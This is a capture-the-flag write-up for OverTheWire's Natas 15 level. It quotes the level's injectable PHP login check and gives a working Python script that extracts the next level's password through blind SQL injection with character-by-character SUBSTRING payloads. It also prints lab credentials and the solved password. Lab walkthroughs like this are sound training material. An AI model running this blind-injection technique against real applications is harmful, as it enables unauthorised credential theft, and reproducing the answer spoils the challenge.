# Natas 14 - Natas 15
    Username  : natas15
    Password  : SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
    URL       : http://natas15.natas.labs.overthewire.org'

# Solution

As usual , we are going to chech the source page
```
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

The only answers we’ll get from this page are :

    This user doesn’t exist .
    This user exists .

However, there is an SQL injection in the username field, but it’s a blind one. We only get true/false answers. We just nee to find a way to forge a query that will answer to questions like “Does the password for natas16 starts with ‘a’ ?” and get the results.
We can write a python script to automate this brute force attack

```
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

charset = string.ascii_letters + string.digits
extracted_password = ""

session = requests.Session()
session.auth = (username, password)

for position in range(1, 33):
    for char in charset:
        payload = { 'username': f'natas16" AND BINARY SUBSTRING(password,{position},1)=\'{char}\' -- -' }
        response = session.post(url, data=payload)
        if "This user exists" in response.text:
            extracted_password += char
            print(f"[+] Found character {position}: {char} → Current: {extracted_password}")
            break

print(f"[!] Complete password: {extracted_password}")

```
This python script will check each chatacter wheather True or False (User exist or not) and the append it to an array and then print the filnal array (Password) as output

# Password 
    hPkjKYviLQctEW33QmuXL6eDVfMW4sGo


